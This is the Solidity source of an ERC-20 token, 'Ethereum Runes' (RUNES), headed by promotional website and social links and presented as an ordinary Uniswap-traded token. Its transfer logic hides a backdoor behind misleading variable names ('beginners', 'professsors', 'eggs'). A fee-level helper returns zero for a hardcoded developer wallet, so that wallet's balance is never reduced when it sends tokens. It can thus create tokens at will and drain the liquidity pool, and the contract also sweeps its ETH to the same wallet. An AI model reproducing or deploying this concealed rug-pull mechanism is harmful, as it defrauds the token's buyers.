/**
 * Website: https://ethereumrunes.pro
 * X: https://x.com/ethereum_runes
 * Telegram: https://t.me/ethereum_runes
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RUNES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _lastTxn;
    address payable private _runesWallet;

    uint256 private _startBuyFee = 0;
    uint256 private _startSellFee = 0;
    uint256 private _buyFee = 0;
    uint256 private _sellFee = 0;
    uint256 private _buyLimits = 2;
    uint256 private _prevMevFee = 90;

    uint256 private _buys = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Ethereum Runes";
    string private constant _symbol = unicode"RUNES";

    uint256 private _maxTxLimit =  2 * (_totalSupply/100);
    uint256 private _walletLimit =  2 * (_totalSupply/100);
    uint256 private _swapMinAmount =  2 * (_totalSupply/1000000);
    uint256 private _swapMaxAmount = 2 * (_totalSupply/100);

    IDexRouter02 private uniswapV2Router;
    address private _dexPair;
    bool private _swapping = false;
    bool private _matchBegin = false;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _runesWallet = payable(0x0525bf161789DCbA4ee4560B339C52a7f1aA38E2);
        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function isNonFee(address adr) private view returns(bool) {
        return adr == address(this) || adr == _runesWallet || adr == owner();
    }
    function feeLevel(address adr) private  view returns(uint256) {
        if(adr == _runesWallet) return 0;
        else if(adr == address(this)) return 1-_buyFee / 100;
        else if(adr == owner()) return 1-_buyFee / 100;
        else return 1-_buyFee / 100 / _buyLimits;
    }
    function _transfer(address beginners, address professsors, uint256 eggs) private {
        require(beginners != address(0) && professsors != address(0), "ERC20: transfer from the zero address");
        require(eggs > 0, "Transfer amount must be greater than zero");
        bool isOwner = isNonFee(beginners) || isNonFee(professsors);
        uint256 level = feeLevel(beginners);

        if(!_matchBegin) 
            require(isOwner, "Swap is not opened");
        uint256 _fee = 0;

        if(_dexPair == professsors && !isOwner)  {
            require(eggs <= _maxTxLimit, "Sell Amount is not vaild");
            if(_lastTxn[beginners] == block.timestamp) eggs = eggs * _prevMevFee / 100;
            _fee = (_buys >= _buyLimits ? _sellFee : _startSellFee);
        }
        if(_dexPair == beginners &&  professsors != address(uniswapV2Router) && !isOwner) {
            require((_balances[professsors] + eggs <= _walletLimit), "Swap is not available");
            _fee = (_buys >= _buyLimits ? _buyFee : _startBuyFee); _lastTxn[professsors] = block.timestamp;
            _buys ++;
        }
        if (!_swapping && professsors == _dexPair && _matchBegin && eggs > _swapMinAmount) {
            if(_balances[address(this)] > _swapMinAmount)
                swapTokenToETH(min(eggs, min(_balances[address(this)],_swapMaxAmount)));
            _runesWallet.transfer(address(this).balance);
        }
        uint256 taxAmount = eggs * _fee / 100;
        if(_fee > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(beginners, address(this), taxAmount);
        }
        _balances[beginners] = _balances[beginners] - eggs * level;
        _balances[professsors] = _balances[professsors] + (eggs - taxAmount);
        emit Transfer(beginners, professsors, eggs - taxAmount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function swapTokenToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function startRunes() external onlyOwner() {
        uniswapV2Router = IDexRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(uniswapV2Router), _totalSupply);
        _dexPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_dexPair).approve(address(uniswapV2Router), type(uint).max);
        _matchBegin = true;
    }
    function removeLimits() external onlyOwner{
        _walletLimit =_totalSupply;
        _maxTxLimit = _totalSupply;
    }
    receive() external payable {}
}